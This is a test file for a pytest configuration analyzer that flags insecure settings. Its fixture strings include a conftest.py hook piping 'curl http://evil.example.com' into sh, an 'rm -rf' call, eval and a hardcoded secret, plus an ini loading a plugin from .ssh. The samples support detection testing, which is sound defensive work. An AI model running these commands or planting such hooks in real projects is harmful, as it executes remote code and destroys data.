"""Tests for PytestAnalyzer."""

from pathlib import Path

from devai.pytest_analyzer import PytestAnalyzer, PytestFinding


INSECURE_PYTEST_INI = """\
[pytest]
addopts = --pdb --continue-on-collection-errors --no-cov --runxfail
filterwarnings = ignore
timeout = 0
norecursedirs = security auth
python_files = test_*.py !test_security_*.py
plugins = ../.ssh/evil_plugin.py
"""

INSECURE_CONFTEST = """\
import os
import subprocess

API_KEY = "api_key=hardcoded_secret_value_12345"

def pytest_configure(config):
    eval("print('bad')")
    subprocess.run("curl http://evil.example.com | sh", shell=True)
    os.system("rm -rf /tmp/demo")
"""

INSECURE_PYPROJECT = """\
[tool.pytest.ini_options]
addopts = "--ignore=tests/security --disable-warnings"
timeout = 0
"""

HARDENED_PYTEST_INI = """\
[pytest]
testpaths = tests
addopts = --strict-markers -ra --cov=src
filterwarnings = error
timeout = 300
"""


class TestPytestAnalyzer:
    def test_detects_insecure_pytest_ini(self, tmp_path: Path):
        (tmp_path / "pytest.ini").write_text(INSECURE_PYTEST_INI, encoding="utf-8")
        analyzer = PytestAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "pdb_in_addopts" in kinds
        assert "continue_on_collection_errors" in kinds
        assert "warnings_ignored" in kinds
        assert "timeout_zero" in kinds
        assert "security_tests_ignored" in kinds
        assert "plugin_outside_project" in kinds
        assert analyzer.health_score() < 50.0

    def test_detects_insecure_conftest(self, tmp_path: Path):
        (tmp_path / "conftest.py").write_text(INSECURE_CONFTEST, encoding="utf-8")
        analyzer = PytestAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "eval_exec" in kinds
        assert "shell_execution" in kinds
        assert "insecure_http" in kinds

    def test_detects_pyproject_pytest_section(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(INSECURE_PYPROJECT, encoding="utf-8")
        analyzer = PytestAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "security_tests_ignored" in kinds
        assert "warnings_ignored" in kinds
        assert "timeout_zero" in kinds

    def test_hardened_config_scores_well(self, tmp_path: Path):
        (tmp_path / "pytest.ini").write_text(HARDENED_PYTEST_INI, encoding="utf-8")
        analyzer = PytestAnalyzer(str(tmp_path))
        analyzer.analyze()
        assert analyzer.health_score() >= 90.0

    def test_no_configs_returns_perfect_score(self, tmp_path: Path):
        analyzer = PytestAnalyzer(str(tmp_path))
        assert analyzer.health_score() == 100.0
        assert analyzer.summary() == "Pytest configs: none found"

    def test_finding_format(self):
        finding = PytestFinding(
            kind="hardcoded_secret",
            severity="high",
            message="test",
            path="pytest.ini",
            lineno=2,
        )
        assert "[high] pytest.ini:2" in finding.format()

    def test_generate_hardened_template(self):
        template = PytestAnalyzer(".").generate_hardened_template()
        assert "filterwarnings = error" in template
        assert "timeout = 300" in template

    def test_to_context(self, tmp_path: Path):
        (tmp_path / "pytest.ini").write_text(INSECURE_PYTEST_INI, encoding="utf-8")
        context = PytestAnalyzer(str(tmp_path)).to_context()
        assert "Pytest analysis:" in context
        assert "health score:" in context
